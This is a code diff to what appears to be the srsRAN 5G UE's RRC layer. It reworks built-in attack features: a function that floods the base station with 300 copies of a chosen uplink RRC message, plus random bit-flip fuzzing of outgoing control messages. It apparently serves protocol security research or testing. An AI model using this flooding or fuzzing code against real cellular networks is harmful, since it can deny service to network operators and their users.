@@ -664,12 +664,8 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
 
   std::string msg_name = msg.msg.c1().type().to_string();
 
-
-  RRC_message_name = msg_name;
-
-
-  if (args.target_signal_attack == msg_name && args.target_signal_attack != ""){
-   rlc->write_sdu(lcid, std::move(signal_flood_ccch(lcid, std::move(pdu), msg_name)));
+  if (args.target_signal_attack == msg_name){
+    rlc->write_sdu(lcid, std::move(signal_flood_ccch(lcid, std::move(pdu), msg_name)));
     return;
   }
 
@@ -678,43 +674,22 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
     return;
   }
 
-
-/*
-   if (args.rlc_buffer_overflow_attack == 1){
-
-    std::cout << "Buffer Overflow Attack: " << std::endl
-    << "\tRLC pdu length: " << rlc_pdu_len<< std::endl
-    << "MAC Buffer remaining space: " << mac_buff_rem_space << std::endl;
-
-
-  }
-
-*/
-
-
   rlc->write_sdu(lcid, std::move(pdu));
 }
 
-
-srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name)
-{
- 
+srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name){
+  for (uint16_t i = 0; i < 300; i++)
+  {
     srsran::unique_byte_buffer_t new_buffer(pdu.get());
-    std::cout << std::endl<<"Signal flooding message: (test)" << std::endl
+    std::cout << "Flooding message: " << std::endl
                 << "\tMessage Type: " << msg_name << std::endl
                 << "\taddress: " << new_buffer.get()  << std::endl
                 << "\tMsg length(bytes): " << new_buffer->N_bytes << std::endl
                 << "\tRRC state: " << rrc_nr_state_text[state] << std::endl;
     rlc->write_sdu(lcid, std::move(new_buffer));
-
+  }
   return std::move(pdu);
 }
-
-
-
-
-
-
 
 srsran::unique_byte_buffer_t rrc_nr::fuzz_ccch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_ccch_msg_s msg, std::string msg_name){
   std::cout << "Fuzzing message: " << std::endl
@@ -722,7 +697,6 @@ srsran::unique_byte_buffer_t rrc_nr::fuzz_ccch_msg(srsran::unique_byte_buffer_t 
               << "\taddress: " << pdu.get()  << std::endl
               << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
               << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl;
-
   for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
         uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
         uint8_t bit_to_flip = std::rand() % 8;
@@ -754,7 +728,7 @@ void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
 
   std::string msg_name = msg.msg.c1().type().to_string();
 
-  if (args.target_signal_attack == msg_name && args.target_signal_attack !=""){
+  if (args.target_signal_attack == msg_name){
     pdcp->write_sdu(lcid, std::move(signal_flood_ccch(lcid, std::move(pdu), msg_name)));
     return;
   }
@@ -767,8 +741,7 @@ void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
   pdcp->write_sdu(lcid, std::move(pdu));
 }
 
-srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_dcch_msg_s msg, std::string msg_name)
-{
+srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_dcch_msg_s msg, std::string msg_name){
   std::cout << "Fuzzing message: " << std::endl
               << "\tMessage Type: " << msg_name << std::endl
               << "\taddress: " << pdu.get()  << std::endl
@@ -779,8 +752,6 @@ srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t 
         uint8_t bit_to_flip = std::rand() % 8;
         pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
   }
-
-
   return std::move(pdu);
 }
 
